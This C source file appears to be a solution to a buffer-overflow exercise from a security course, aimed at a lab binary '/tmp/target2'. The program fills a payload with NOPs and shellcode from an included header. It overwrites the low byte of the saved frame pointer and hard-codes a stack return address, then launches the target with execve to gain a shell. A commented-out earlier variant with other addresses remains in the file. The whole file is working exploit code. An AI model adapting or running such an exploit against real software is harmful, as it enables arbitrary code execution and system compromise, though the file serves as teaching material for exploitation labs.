#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/tmp/target2"

char payload[202];

int main(void) {
  int i;

  // fill from 0-199 with nops
  for(i=0; i<202; i++)
      payload[i] = 0x90;

  strcpy(payload, shellcode);
  payload[45] = 'A';

  payload[200] = 0x88; // so that ebp points to 0xbffffd-88

  // this is where eip will point
  payload[196] = 0xc8;
  payload[197] = 0xfc;
  payload[198] = 0xff;
  payload[199] = 0xbf;

/*
  // to stop the copy process // at address 0xbffffd90
  // current value at that address is 0xbffffd00 (last 2 bytes can be changed only)
  // needs to jump to an address belonging to bar's address space

//strcpy(payload, shellcode);

  payload[201] = 0;
  payload[200] = 0x00; // so that ebp points to 0xbffffe-00

  // this is where eip will point
  payload[196] = 0x04;
  payload[197] = 0xfe;
  payload[198] = 0xff;
  payload[199] = 0xbf;

  //strcpy(payload, shellcode);
  //payload[45] = 0x00;

 for(i=0; i<sizeof(shellcode); i++){
    payload[i] = shellcode[i];
  }

  payload[sizeof(shellcode)] = 0;
*/


  char *args[] = { TARGET, payload, NULL };
  char *env[] = { NULL };

  execve(TARGET, args, env);
  fprintf(stderr, "execve failed.\n");

  return 0;
}
